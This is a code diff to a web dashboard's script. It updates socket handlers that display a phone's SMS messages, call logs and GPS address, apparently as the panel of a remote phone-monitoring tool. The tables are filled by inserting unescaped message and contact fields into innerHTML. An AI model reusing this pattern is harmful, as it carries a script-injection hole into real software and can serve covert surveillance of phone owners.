@@ -71,13 +71,16 @@
         document.getElementById('sms-table').innerHTML = data.map(m => `<tr><td class="${m.type}">${m.type}</td><td>${m.address}</td><td>${m.body}</td><td>${new Date(m.date).toLocaleString()}</td></tr>`).join('');
     });
 
-    socket.on('ui-calls-display', (data) => {
-        document.getElementById('calls-table').innerHTML = data.map(c => `<tr><td class="${c.type}">${c.type}</td><td>${c.name || 'Unknown'}</td><td>${c.number}</td><td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td></tr>`).join('');
-    });
+   socket.on('ui-calls-display', (data) => {
+    const html = data.map(c => `<tr><td>${c.type}</td><td>${c.name || 'Unknown'}</td><td>${c.number}</td><td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td></tr>`).join('');
+    document.getElementById('calls-table').innerHTML = html;
+});
 
-    socket.on('ui-gps', (data) => {
-        document.getElementById('addr').innerText = data.address;
-    });
+socket.on('ui-gps', (data) => {
+    // If you have an address span or map:
+    document.getElementById('addr-display').innerText = data.address;
+});
 </script>
 </body>
 </html>
+
